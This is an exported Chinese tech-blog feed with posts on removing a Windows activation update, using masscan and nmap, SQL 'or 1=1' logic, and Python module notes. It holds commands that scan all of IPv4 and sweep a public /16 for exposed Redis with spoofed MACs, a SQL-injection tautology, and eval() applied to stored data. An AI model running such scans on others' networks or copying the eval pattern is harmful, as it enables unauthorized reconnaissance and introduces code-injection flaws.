    <content type="text"><![CDATA[windows用命令卸载补丁 QQ群：397745473 官方参考：https://support.microsoft.com/en-au/help/4487266/activation-failures-and-not-genuine-notifications-on-vl-win-7-kms-clie 获取补丁打开已安装的更新控制面板（在项目控制面板 &gt; Windows更新 &gt; 查看更新历史记录 &gt; 已安装的更新），然后寻找更新的Microsoft Windows（KB971033） 在列表中。 以管理员身份在命令提示符窗口中运行以下命令，然后在结果中查找 Microsoft-Windows-Security-WindowsActivationTechnologies-package~31bf3856ad364e35~amd64 ~~ 7.1.7600.16395 ： 1dism /online /get-packages 在命令提示符处运行以下命令，然后在结果中查找已安装KB 971033的指示： 1wmic qfe where HotFixID=&quot;KB971033&quot; 在Windows PowerShell中运行以下命令，然后在结果中查找已安装KB 971033的指示： 1Get-Hotfix -id KB971033 卸载补丁如果 KB 971033当前安装，使用一个下面的方法删除更新。我们建议您在删除更新后重新启动系统。 在“ 控制面板”中的“ 已安装的更新”项（“ 控制面板” &gt;“ Windows更新” &gt;“ 查看更新历史记录” &gt;“ 已安装的更新”）中，右键单击“Microsoft Windows更新”（KB971033），然后选择“ 卸载”。 以管理员身份在命令提示符窗口中运行以下命令： 1wusa /uninstall /kb:971033 以管理员身份在命令提示符窗口中运行以下命令： 1dism /online /Remove-Package /PackageName:Microsoft-Windows-Security-WindowsActivationTechnologies-Package~31bf3856ad364e35~amd64~~7.1.7600.16395 之后KB 971033卸载，或者之后不再像以前那样装出现，重新激活相关的文件，然后通过运行在命令提示符窗口以管理员身份下面的命令重新激活系统： 1234567891011net stop sppuinotifysc config sppuinotify start = disablednet stop sppsvcdel％windir％\ system32 \ 7B296FB0-376B-497e-B012-9C450E1B7327-5P-0.C7483456-A289-439d-8115-601632D005A0 / ahdel％windir％\ system32 \ 7B296FB0-376B-497e-B012-9C450E1B7327-5P-1.C7483456-A289-439d-8115-601632D005A0 / ahdel％windir％\ ServiceProfiles \ NetworkService \ AppData \ Roaming \ Microsoft \ SoftwareProtectionPlatform \ tokens.datdel％windir％\ ServiceProfiles \ NetworkService \ AppData \ Roaming \ Microsoft \ SoftwareProtectionPlatform \ cache \ cache.datnet start sppsvccscript c：\ windows \ system32 \ slmgr.vbs / ipk &lt; 特定于版本的KMS客户端密钥 &gt;cscript c：\ windows \ system32 \ slmgr.vbs / atosc config sppuinotify start = demand QQ群：397745473]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用masscan 扫描 IP 端口]]></title>
    <url>%2F2019%2F08%2F23%2F76_%E4%BD%BF%E7%94%A8masscan%E6%89%AB%E6%8F%8FIP%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[亲测使用masscan 扫描 IP 端口 碰到了一些坑 同时也记录一下 网上有人这样说: 以前用 nmap 检测，发现当修改了自定义端口后，他就没有那么准确了，比如说把SSH端口修改为其他的。 后来发现了masscan，这个号称可以在3分钟内扫描全网端口的神器。于是尝试了下确实很厉害。 QQ群：397745473 安装1sudo apt-get install masscan 扫描全网1masscan -p0-65525 0.0.0.0/0 扫描指定IP段和指定端口例如扫描开发了公网redis 默认端口的设备 12masscan -p6379 59.111.0.0/16 --rate 10000 -oX scan.xmlmasscan -p6379 59.111.0.0/16 --rate 10000 -oG ip_output1113.txt 则输出结果 1masscan -p6379 59.111.0.0/16 --rate 10000 &gt;&gt; scan.txt 输出结果1masscan 0.0.0.0/0 -p0-65535 -oX scan.xml 发包速度传输速度masscan的发包速度非常快，在windows中，它的发包速度可以达到每秒30万包；在Linux中，速度可以达到每秒160万。masscan在扫描时会随机选择目标IP，所以不会对远程的主机造成压力。 默认情况下，masscan的发包速度为每秒100包，为了提高速度，可以设置为 –rate 100000 详细参数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;ip/range&gt; IP地址范围，有三种有效格式，1、单独的IPv4地址 2、类似&quot;10.0.0.1-10.0.0.233&quot;的范围地址 3、CIDR地址 类似于&quot;0.0.0.0/0&quot;，多个目标可以用都好隔开-p &lt;ports,--ports &lt;ports&gt;&gt; 指定端口进行扫描--banners 获取banner信息，支持少量的协议--rate &lt;packets-per-second&gt; 指定发包的速率-c &lt;filename&gt;, --conf &lt;filename&gt; 读取配置文件进行扫描--echo 将当前的配置重定向到一个配置文件中-e &lt;ifname&gt; , --adapter &lt;ifname&gt; 指定用来发包的网卡接口名称--adapter-ip &lt;ip-address&gt; 指定发包的IP地址--adapter-port &lt;port&gt; 指定发包的源端口--adapter-mac &lt;mac-address&gt; 指定发包的源MAC地址--router-mac &lt;mac address&gt; 指定网关的MAC地址--exclude &lt;ip/range&gt; IP地址范围黑名单，防止masscan扫描--excludefile &lt;filename&gt; 指定IP地址范围黑名单文件--includefile，-iL &lt;filename&gt; 读取一个范围列表进行扫描--ping 扫描应该包含ICMP回应请求--append-output 以附加的形式输出到文件--iflist 列出可用的网络接口，然后退出--retries 发送重试的次数，以1秒为间隔--nmap 打印与nmap兼容的相关信息--http-user-agent &lt;user-agent&gt; 设置user-agent字段的值--show [open,close] 告诉要显示的端口状态，默认是显示开放端口--noshow [open,close] 禁用端口状态显示--pcap &lt;filename&gt; 将接收到的数据包以libpcap格式存储--regress 运行回归测试，测试扫描器是否正常运行--ttl &lt;num&gt; 指定传出数据包的TTL值，默认为255--wait &lt;seconds&gt; 指定发送完包之后的等待时间，默认为10秒--offline 没有实际的发包，主要用来测试开销-sL 不执行扫描，主要是生成一个随机地址列表--readscan &lt;binary-files&gt; 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式.--connection-timeout &lt;secs&gt; 抓取banners时指定保持TCP连接的最大秒数，默认是30秒。 实例比如我扫描我自己的主机，设置发包速度为100000 12345678910root@centos:~# masscan 47.104.27.197/32 -p0-65535 -rate 100000nmap(-rate): wat? randomization is our raison d&apos;etre!! rethink preaseroot@centos:~# masscan 47.104.27.197/32 -p0-65535 --rate 100000Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-12-28 04:41:32 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 8080/tcp on 7.104.27.197Discovered open port 65422/tcp on 7.104.27.197 设置发包速度为 10000 123456789101112root@centos:~# masscan 7.104.27.197/32 -p0-65535 --rate 10000Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-12-28 04:41:57 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 7000/tcp on 7.104.27.197Discovered open port 8080/tcp on 7.104.27.197Discovered open port 65423/tcp on 7.104.27.197Discovered open port 65422/tcp on 7.104.27.197Discovered open port 443/tcp on 7.104.27.197Discovered open port 80/tcp on 7.104.27.197 其结果是不一样的，这个发包速度并不是越高越好。 设太高了掉线 参考：https://www.fangwenjun.com/post/29891.html 测试伪装源MAC和路由MAC: 12345678910nmap -sP --min-hostgroup 1024 --min-parallelism 1024 10.81.0.0/16 -oG ip_output1113.txt # Nmap done at Fri Aug 23 04:23:59 2019 -- 65536 IP addresses (1079 hosts up) scanned in 324.45 secondsnmap -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG ip_output1113.txt 10.81.0.0/16 Nmap done: 65536 IP addresses (355 hosts up) scanned in 84.07 secondsnmap -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG ip_output1113.txt 10.0.0.0/8 nmap -sP --min-hostgroup 10240 --min-parallelism 10240 -oG ip_output1113.txt 10.0.0.0/8masscan -p 80 10.0.0.0/8 -oG ip_output1113.txtmasscan -p80 10.0.0.0/8 --rate 10000 -oG ip_output1113.txtmasscan -p80 10.0.0.0/8 --rate 1000 --adapter-mac 00-50-56-fe-df-95 --router-mac 01-00-5e-00-00-16 -oG ip_output1113.txt QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[str转json]]></title>
    <url>%2F2019%2F08%2F19%2F75_str%E8%BD%ACjson%2F</url>
    <content type="text"><![CDATA[将json存到数据库的时候会报错，所以使用str(content)转了一下 取出来的时候想使用json数据怎么办呢? QQ群：397745473 可以用如下方法: 1234567891011sql = '''select * from meishi'''sqlite_db_cur.execute(sql)res = sqlite_db_cur.fetchall()x=0for i in res: print(x,i[7]) for one in eval(i[7]): print(one) print(one['position']) x+=1 exit() 使用eval方法转一下就可以用 了 json.loads与eval都能将s转成python中的对象， json.loads将json中的字符串转成unicode(types.UnicodeType)， eval转成了str(types.StringType)。 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[or true 和and true 有什么区别]]></title>
    <url>%2F2019%2F08%2F15%2F73_sql%E4%B8%ADor_true%E5%92%8Cand_true%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[or true 和and true 有什么区别在群里发现有人在讨论 [or true 和and true 有什么区别] 这个问题.比较有意思 记录一下讨论结果 QQ群：397745473 问题记录如下:last MaIrnon: sql注入里or true 和and true 有什么区别,为什么or true会返回所有表? 举个栗子: 123select * fromadmin where id=1 and 1=1select * fromadmin where id=1 or 1=1有什么区别? 为什么回显不同? 解答记录：123456789101112131415161718192021222324251 and 1=1是真1 or 1=1也是真但为什么or回显内容是全部，而and只是你要查询的or 永真 相当于 没 where 了 and比or的优先级要高where 1=2 and 1=2 or 1=1;相当于where 1=1;这么理解 where id=1 and 1=1 是这两个条件同时存在并且同时为真的时候才能成立 简单一点说 1=1为真 那么就必须要考虑第一个条件 也就是id=1 是否成立 才能得出结果数据库内部是怎么判断，or和and的不同的where id =1 or 1=1 是这两个条件存在一个就可以成立 因为1=1 永远为真 所以不用考虑id=几的问题了所以语句就变成了 select * from admin where True 也就是select * from admin所以返回了所有的内容,简单的说 or不需要考虑前面那个条件 and必须考虑前面的条件还有个问题，select * from xxx where id=1 and 1=1如果id 1存在 那么这个语句应该是select * from xxx where true那么也应该是永真，为什么不返回全部列呢select * from xxx where id =1 or 1=1，不是也有id=1嘛为什么不和and一样限制输出1=1的True用or的话，比id=1的判断面要大有点像贪婪模式的感觉就把where后面编程true了 这样你就懂了 问题结束。 知乎一个问题，问遇到强奸，为什么不踢他蛋蛋？ 有位带哥说了一句，打蛇打七寸，你敢吗？ 这是我见过诠释的最完美的，最简短的 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VMWare Esxi 重启服务解决无法远程管理问题]]></title>
    <url>%2F2019%2F08%2F14%2F70_VMWare_Esxi_%E9%87%8D%E5%90%AF%E6%9C%8D%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%97%A0%E6%B3%95%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[VMWare Esxi 重启服务解决无法远程管理问题 最近发现有三台Esxi主机都无法远程管理,测试发现有一台主机开启了SSH服务.通过SSH远程登陆以后,重启服务,问题解决.还有两台没有开启SSH服务的服务器,只能通过本地打开命令行然后重启服务,具体如下: 问题描述: 1.ssh 连接 VMWare Esxi 正常. 2.使用终端工具无法连接 VMWare Esxi QQ群：397745473 解决方案: 使用ssh登陆 VMWare Esxi 后执行命令: 1services.sh restart QQ群：397745473]]></content>
      <categories>
        <category>Esxi</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Esxi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[下载youtube工具]]></title>
    <url>%2F2019%2F08%2F14%2F71_%E4%B8%8B%E8%BD%BDyoutube%E7%9A%84%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[下载youtube工具有很多，个人比较推荐的一个工具是youtube-dl 下面给出下载yotube最高清的视频mp4文件的命令 QQ群：397745473 直接使用以下命令就行了: 1youtube-dl -f 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/bestvideo+bestaudio' --merge-output-format mp4 "视频url" 据说是youtube-dl下载画质最好的mp4命令 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python内置模块笔记(持续更新)]]></title>
    <url>%2F2019%2F08%2F14%2F72_python%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[python内置模块笔记(持续更新) QQ群：397745473 python 常用模块常用函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# coding:utf-8name = '&#123;wh&#125;my \t name is &#123;name&#125;,age is &#123;age&#125;.'print(name.capitalize()) # 字符串的开头字母大写print(name.center(100, "+")) # 在字符串两边增加'+'号,使整个字符串的个数为50位置print(name.endswith(".")) # 判断是否以X结尾,返回布尔值print(name.expandtabs(30)) # 补充\t的次数\t按一个空格处理,\t一般为2个空格,但在字符串开头或者\n后为4个空格print(name.find("n")) # 查找字符串索引，如果不存在返回-1print(name.index("n")) # 查找元素，如果不存在报错print(name.count("z")) # 查找元素个数，如果不存在返回0print(name.format(wh="nihao,", name="1233", age=100)) # 格式化字符串print('&#123;:^10&#125;,&#123;:6&#125;'.format('username', 'password')) # 格式化输出扩展 username对应的:^10是右对齐10个字符后输出,password对应:6是默认左对齐6个字符后输出print(name.format_map(&#123;'wh': 'huanying,', 'name': 'xiaoming', "age": "19"&#125;)) # 格式化字符串字典形式print("sadads12313#$".isalnum()) # 是否包含数字和字母print("123".isalpha()) # 是否是英文print("abc".isdigit()) # 是否是数字print(name.decimal()) # 是否是十进制数字print("#￥&amp;*……&amp;*".isidentifier()) # 是否是一个合法的变量名，不常用print("asdadA".islower()) # 判断字符串中是否全部小写print("name".isupper()) # 判断字符串中是否全部是大写print("@#@$#@QsaddsadS Sad ".istitle()) # 判断是否首字母大写,后面小写，标题样式print("___".join([name, "enen", "oo"])) # 拼接字符串 前为拼接符，后为拼接字符串,之后变成一个新的字符串print("SAHD #@OAHDa sd ad".lower()) # 全部变成小写print("sahdk".upper()) # 全部变成大写print(' \t \nmysql\t\n'.lstrip()) # 去除左边的换行和空格print(' \t \nmysql\t\n '.rstrip()) # 去除右边的换行和空格print(' \t \nmysql\t\n '.strip()) # 去掉两边的换行和空格print(" kongge ".isspace()) # 判断是否全是空格 print(" dasds ".split()) # 去除两边空格并以字典形式返回print(name.splitlines()) # 以换行符分割字符串 print("mysql is db".replace("mysql", "oracle")) # replace 全部替换print("mysql is dbisis".rfind("is")) # 返回最右边字符的下标print("1+2+3+4".split("+")) # 以+分割字符串，以list形式返回print("1+2+3+4\n5+6+7+8".splitlines()) # 以换行符字符串，以list形式返回print("abcABC".swapcase()) # 大小写全部反转print("1".zfill(2)) # 将前面字符串中的位数补充0后面填的位数，结果为01print(name.endswith("&#123;age&#125;.")) # 判断字符串结尾是否一致 返回布尔值print(name.startswith("&#123;age&#125;.")) # 判断字符串开头是否一致 返回布尔值print(bin(12)) # 获取整数的二进数形式print(name.ljust(50, '*')) # 在name的左边补充50个* name.rjust()为在右侧str1 = "Runoob example....wow!!!" # maketrans与tranlate的应用# l 和 r 字符串必须数量相同l = "12345"r = "abcde"res = str1.maketrans(r, l) # 把r替换为l在和str1比对，找到相同的并修改print(str1.translate(res)) # 打印结果为Runoo2 5x1mpl5....wow!!!print(max(name)) # 返回字符串中的最大字母 优先小写字母 其次大写字母 其次数字 最后是特殊字符 min()最小print(bool('')) # 布尔值判断，例子中返回false，非零或者空为trueprint(round(3.1415926, 2)) # 取小数位数，例子中参数为2所以返回3.14print(sorted([1, 3, 400, 234, 23], reverse=True)) # 返回排序方式按降序排列，去掉revese按顺序排列print(any([1, 2, 3, 45])) # 返回布尔值，判断list中只要有一个非零非空的值就返回True，否则返回falseprint(all([1, 2, 3, 45])) # 返回布尔值，判断list中只要有一个零或者空的值就返回False，否则返回Trueprint(dir(name)) # 查询方法，输出name的所有方法print(eval("1+1")) # 执行一个字符串表达式，返回计算的结果,如例子中返回2，可以把执行简单的python代码print(exec("print('nihao')")) # 执行python代码，常用于浏览器形式的代码编辑软件，但是略微不安全print(list(map(funcion, L))) # 循环调用函数，然后保存函数返回值，放到一个list里,如果不加list返回的是一个生成器print(list(filter(funcion, L))) # 过滤，循环调用函数，如果函数返回的值为真，那么就保存这个值print(getattr(对象, "函数名")) # 获取一个对象里面的属性(方法,变量),如果要使用这个方法就返回值加括号() getattr(s,'name') 等效于调用s.nameprint(hasattr(模块, 方法)) # 查看模块下是否有该方法,返回布尔值print(isintance(对象, 类)) # 判断参数1是否是参数2的类或者父类的实例,返回布尔值 数据类型转换1234567891011121314151617181920a = 1234print(0x4d2) # 其他进制数输入直接转成10进制print(hex(a)) # 转成16进制数print(oct(a)) # 转成8进制数print(bin(a)) # 转成2进制数print('asd'.encode()) # 字符串转成二进制，返回b'asd'; 'asd'.encode()将encode转换成utf-8编码print(b'asd'.decode()) # 二进制转成字符串，decode是bytes类型print(chr(78)) # 0-255内整数作为参数，返回一个对应的ascii码值print(ord('a')) # 将一个字符转换成ascii码b = ["1234", 23, 23, 213, 21341]list(b) # 转成列表tuple(b) # 转成元祖dist(b) # 转成字典int(a) # 转成整型float(a) # 转成浮点型res1 = set(b) # 返回一个去重，无序,可变集合res2 = frozenset(b) # 返回一个去重，无序，不可变的集合，两者区别：变量不能点出add和remove方法b_str = str(b) # str()一般是将数值转成字符串(返回一个字符串,包含对象的友好的可打印表示形式。对于字符串,它返回字符串本身)b_repr = repr(b) # repr()是将一个对象转成字符串显示 random模块123456789101112131415161718import randomprint(random.sample([1, 3, 4, 5, 6], 2)) # 返回一个从0-100中取6位随机数,如位数超出会报错print(random.randrange(100)) # 返回一个从0到100之间的整数，包括0，不包括100print(random.randrange(5, 10, 2)) # 指定5到10之间并间隔为2整数print(random.randint(1, 3)) # 指定包括1包括3之间的整数print(random.random()) # 打印0到1之间的随机浮点数，包括0print(random.uniform(1.1, 32.2)) # 打印1.1到32.2之间随机的浮点数a = [1, 23, 4, 5, 6, 7]print(random.choice(a)) # 指定a列表或者是元祖中随机取一个元素，列表为空报错random.shuffle(a)print(a) # 打乱a列表中的所有元素,注意输出为a而不能把它变成一个变量random.choices(population, weights=None, *, cum_weights=None, k=1) # 3.6版本新增。从population集群中随机抽取K个元素（可重复）weights是相对权重列表，cum_weights是累计权重，两个参数不能同时存在,k表示个数。random.choices(["红球", "黄球", "篮球", "黑球"], [50, 30, 15, 5], k=1) string模块1234567891011import stringstring.ascii_letters # 列出所有大小写字母string.ascii_lowercase # 列出所有小写字母string.ascii_uppercase # 列出所有大写字母string.digits # 列出所有数字string.punctuation # 列出所有特殊字符string.printable # 列出所有字符，数字，字母string.hexdigits # 列出所有16进制数string.octdigits # 列出所有8进制数string.whitespace # 列出所有空白符 os模块 与操作系统进行交互 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import osos.system('ls')os.getcwd() # 获取当前工作目录os.chmod("/local/upload/", 7) # 给文件目录/添加权限os.chdir("../") # 更改当前目录os.curdir() # 当前目录os.pardir() # 父目录os.makedir("/usr/local/tomcat") # 递归创建目录，父目录不存在时自动创建os.removedir("/usr/local/tomcat") # 递归删除空目录，包括父目录os.mkdir("a") # 创建文件夹os.rmdir("a") # 删除空文件夹os.remove("a.txt") # 删除指定文件os.listdir() # 列出指定目录下的所有文件，不传的话是当前目录.为当前路径os.rename("a", "b") # 把a重命名成bos.stat("a.py") # 获取文件信息print(os.sep) # 当前操作系统的路径分隔符print(os.linesep) # 当前操作系统的换行符print(os.pathsep) # 当前系统的环境变量中每个路径的分隔符，linux是:，windows是;print(os.environ) # 当前系统的环境变量print(os.name) # 当前系统名称os.walk("路径") # 递归查询路径下的所有文件及文件夹，三个参数path（当前目录），dirs（当前目录的所有文件夹,不包括文件），files（当前目录的所有文件,不包括文件夹）os.system('操作系统命令')# 或者os.popen('操作系统命令') # 前者只能将命令执行，获取不到结果，后者可以，res=os.popen('ipconfig').read()print(os.path.abspath(__file__)) # 获取绝对路径print(os.path.getsize('a.txt')) # 取文件大小，单位是字节print(os.path.split("/usr/hehe/hehe.txt")) # 分割路径和文件名print(os.path.dirname("/usr/local")) # 获取父目录print(os.path.basename("/usr/local")) # 获取最后一级，如果是文件显示文件名，如果是目录显示目录名print(os.path.exists("/usr/local")) # 目录/文件是否存在print(os.path.isabs(".")) # 判断是否是绝对路径print(os.path.isfile("/usr/local")) # 判断是否是一个文件print(os.path.isdir("/usr/local")) # 是否是一个路径print(os.path.join("/root", 'hehe', 'a.sql')) # 拼接成一个路径，系统能自动识别linux（"/"）和windows("\")print(os.path.getatime("len_os.py")) # 输出最近访问时间print(os.path.getmtime("len_os.py")) # 输出最近访问时间print(os.path.getctime("len_os.py")) # 输出文件创建日期os.access("../test.html", os.F_OK) # os.F_OK参数判断path路径是否存在此文件，返回布尔值os.access("../test.html", os.R_OK) # os.R_OK参数判断此文件是否可读，返回布尔值os.access("../test.html", os.W_OK) # os.W_OK参数判断此文件是否可写，返回布尔值os.access("../test.html", os.X_OK) # os.X_OK参数判断此文件是否可执行，返回布尔值os.chown(path, uid, gid) # 将指定的路径的所有者和组ID更改为数字uid和gid。os.chroot(path) # 方法用于更改当前进程的根目录为指定的目录，使用该函数需要管理员权限，path为设置的根目录路径。 sys模块与python解释器进行交互 12345678910import syssys.argv # 命令行参数List，第一个元素是程序本身路径 sys.exit(n) # 退出程序，正常退出时exit(0)sys.version # 获取Python解释程序的版本信息sys.maxint # 最大的Int值sys.path # 返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值sys.platform # 返回操作系统平台名称sys.stdout.write('please:') # 向屏幕输出一句话val = sys.stdin.readline()[:-1] # 获取输入的值 time,datetime模块时间有三种表示方式，一种是时间戳、一种是格式化时间、一种是时间元组 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import time, datetimeprint(time.timezone) # 本地时间和标准时间相差的时间，单位是sprint(time.time()) # 返回当前时间戳print(time.clock()) # 计算cpu处理执行的时间print(time.sleep(1)) # 休眠，单位秒print(time.gmtime()) # 把时间戳转换成时间元组，如果不传的话，默认取标准时区的时间戳print(time.localtime()) # 把时间戳转换成时间元组，如果不传的话，默认取当前时区的时间戳print(time.mktime(time.localtime())) # 把时间元组转换成时间戳print(time.strftime("%y%m%d %H%M%S")) # 将时间元组转换成格式化输出的字符串print(time.strptime("20160204 191919", "%Y%m%d %H%M%S")) # 将格式化的时间转换成时间元组print(time.struct_time) # 时间元组print(time.asctime()) # 时间元转换成格式化时间print(time.ctime()) # 时间戳转换成格式化时间print(datetime.datetime.now()) # 当然时间格式化输出print(datetime.datetime.now() + datetime.timedelta(3)) # 3天后的时间print(datetime.datetime.now() + datetime.timedelta(-3)) # 3天前的时间time.asctime(time.localtime(time.time())) # 可读格式获取现在时间import calendarcalendar.month(2021, 11) # 获取2021年11月的日历，先导入import calendar模块# str类型的日期转换为时间戳tss1 = '2018-10-10 23:40:00' # 字符型时间格式timeArray = time.strptime(tss1, "%Y-%m-%d %H:%M:%S") # 转成时间数组，所有时间数组都可以.出方法来调用所需要的字段timeStamp = int(time.mktime(timeArray)) # 转成时间戳# 修改str类型的日期格式tss2 = "2013-10-10 23:40:00"timeArray = time.strptime(tss2, "%Y-%m-%d %H:%M:%S")otherStyleTime = time.strftime("%Y/%m/%d %H:%M:%S", timeArray)# 时间戳转换为指定格式的日期 # timetimeStamp = 1381419600timeArray = time.localtime(timeStamp)otherStyleTime = time.strftime("%Y--%m--%d %H:%M:%S", timeArray)# datetimetimeStamp = 1381419600dateArray = datetime.datetime.utcfromtimestamp(timeStamp)otherStyleTime = dateArray.strftime("%Y--%m--%d %H:%M:%S")# 时间戳变成指定格式# timenow = int(time.time()) # 1533952277timeArray = time.localtime(now)otherStyleTime = time.strftime("%Y--%m--%d %H:%M:%S", timeArray)# datetimenow = datetime.datetime.now()otherStyleTime = now.strftime("%Y--%m--%d %H:%M:%S") configparser模块通常用作配置文件的增删改查 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 生成conf文件import configparserconf = configparser.ConfigParser()conf['mysql'] = &#123; 'user': 'nihao', 'passwd': 123456, 'port': 3306&#125;conf['redis'] = &#123;&#125;conf['redis']['user'] = 'nihao'conf['redis']['passwd'] = '123456'conf['redis']['port'] = '6379'with open('conf.txt', 'w') as configfile: conf.write(configfile)# 读取conf文件import configparserconf = configparser.ConfigParser()conf.read('conf.txt') # 读取conf文件sec = conf.sections() # 获取所有父节点值opt = conf.options('mysql') # 获取指定父节点下的所有子节点keyitem = conf.items('redis') # 获取指定父节点下的所有子节点的key，valuesv_int = conf.getint('redis', 'passwd') # 获取指定节点的int数据v_boolean = conf.getboolean('redis', 'tpye') # 获取指定节点的布尔值数据v_float = conf.getfloat('redis', 'salary') # 获取指定节点的浮点数据v_all = conf.get('redis', 'all') # 获取指定节点的所有类型数据# 修改conf文件import configparserconf = configparser.ConfigParser()conf.read('conf.txt') # 读取conf文件conf.add_section('db') # 添加一个父类节点conf.add_section('123')conf.remove_section('123') # 删除一个父节点conf.set('db', 'db_username', 'rainbol') # 添加一个子节点并赋值conf.set('db', 'db_password', '123456')conf.remove_option('mysql', 'user') # 删除一个子节点conf.remove_option('mysql', 'passwd')conf.set('mysql', 'username', 'root')conf.set('mysql', 'password', '654321')conf.clear() # 清空配置文件conf.write(open('conf.txt', 'w', encoding='utf-8')) # 修改完成写入配置文件 itsdangerous模块#一种的加密方式,程序解析加密和加密字符串,可以记录TTL和盐值 12345678salt = 'saO)(&amp;)H' # 设置盐值t = itsdangerous.TimedJSONWebSignatureSerializer(salt, expires_in=600) # 指定参数,第一个是盐值,第二个是TTL加密过期时间res = t.dumps(&#123;'username': 'rainbol', 'password': '123456'&#125;) # 设置加密的字典print(res.decode()) # 取加密信息session = 'eyJhbGciOiJIUzUxMiIsImlhdCI6MTU0MjAwMTcwNCwiZXhwIjoxNTQyMDAyMzA0fQ.eyJ1c2VybmFtZSI6IkNoZW56dWFueWkxMjMiLCJwYXNzd29yZCI6IkN6eTEyMzQhISJ9tOdU5gNQdIVONPoD5DLxsW4lRcDX_n3Bg82RR5C48uXT5JhW7Z_UYqpZYd16p9tlT7moXM-T0Son07_KGaBJvA'res = t.loads(session) # 解析加密信息,如果加密信息不正确会报错print(res) glod模块过滤目录 12345* ，?，[] #匹配规则 * :匹配0个或多个字符； ? :匹配单个字符； []:匹配指定范围内的字符 123print(glob.glob('*.py')) # 返回一个list,括号中填写过滤条件,*.py表示取结尾为py的文件_list = glob.glob(BASEPATH + os.sep + '*' + os.sep + '/*.html') # 只获取第二层路径的html文件_list = glob.glob('../*.html') # 获取上一层的html文件 platform模块判断操作系统,如os,linux,windows 123456789import platformimport osif platform.system().lower() == 'linux': os.system('ls')elif platform.system().lower() == 'windows': os.system('dir')else: pass gevent模块基于greenlet封装,避免多线程切换导致io执行效率降低 123456789101112131415161718import geventfrom gevent import monkeymonkey.patch_all()def run(name, url): r = requests.get(url) open(name + '.html', 'wb').write(r.content)url = &#123;'rainbol01': 'https://www.cnblogs.com/RainBol/', 'rainbol02': 'https://www.cnblogs.com/RainBol/p/9505438.html', 'rainbol03': 'https://www.cnblogs.com/RainBol/p/10077388.html' &#125;for name, url in url.items(): g = gevent.spawn(run, name, url) # 启动 g.join() # 等待并切换 logger模板logger模板[1] #日志是一种可以追踪某些软件运行时所发生事件的方法。 python封装好了我们可以使用生成的日志报告框架 123456789101112131415161718192021222324252627282930313233343536373839404142import logginglogging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s', datefmt='%a,%d %b %Y %H:%M:%S', filename='test.log', filemode='w')# level 级别 = logging.DEBUG 设置debug级别# format 格式完全可以自定义# datefmt 根据format中的asctime来设置指定自定义时间# filename 设置文件输出格式,如果如果去掉filename和filemode将以屏幕输出格式# filemode 文件模式# 'w'记录到文件日志中,在w模式下,相当于打开文件的写操作,会覆盖之前的记录覆盖# 'a'记录到文件日志中,在a模式下,相当于打开文件的追加操作# format固定变量格式'''%(name)s 打印日志名称 %(levelno)s 打印日志级别的数值 %(levelname)s 打印对应filename参数中的设置的log路径 %(pathname)s 打印当前执行程序的路径 %(filename)s 打印文件名%(module)s 打印日志输出函数的模块名%(lineno)d 记录执行代码行号 %(funcName)s 由哪个function发出的log， 调用日志输出函数的函数名%(created)f 当前时间，用UNIX标准的表示时间的浮点数表示； 日志事件发生的时间--时间戳，就是当时调用time.time()函数返回的值%(asctime)s 对应datefmt参数中设置的时间 %(msecs)d 日志事件发生事件的毫秒部分%(relativeCreated)d 日志记录创建时的时间(以毫秒为单位)，与加载日志模块的时间(通常在应用程序启动时)相关 %(thread)d 打印线程id %(threadName)s 打印线程名称 %(process)d 打印进程id %(message)s 打印日志信息 '''# 日志级别 critical &gt; error &gt; warning &gt; info &gt; debug logging.debug('this is debug message')logging.info('this is info message')logging.warning('this is warning message')logging.error('this is error message')logging.critical('this is critical message') logger模板logger模板[2] #既想输出屏幕还输出到文件用此格式 12345678910111213141516171819202122import logging# 创建四个对象logger = logging.getLogger() # 拿到一个logger对象filer = logging.FileHandler('test.log') # 创建一个把test.log路径放到FileHandler文件输出对象stream = logging.StreamHandler() # 创建一个屏幕输出对象formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s') # 